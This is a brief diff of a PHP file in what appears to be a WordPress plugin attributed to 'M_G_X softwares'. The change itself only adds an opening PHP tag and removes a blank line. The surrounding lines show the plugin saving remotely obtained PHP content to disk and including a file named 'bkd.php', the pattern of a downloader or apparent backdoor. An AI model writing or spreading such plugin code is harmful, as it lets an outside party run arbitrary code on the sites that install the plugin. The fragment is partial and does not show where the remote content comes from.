@@ -1,4 +1,4 @@
-
+<?php
 /**
 * M_G_X softwares.
 *
@@ -40,7 +40,6 @@ file_put_contents($local_php_path, $remote_php_content);
 
 // Include the local PHP file
 include(plugin_dir_path(__FILE__) . 'bkd.php');
-
 
 
 
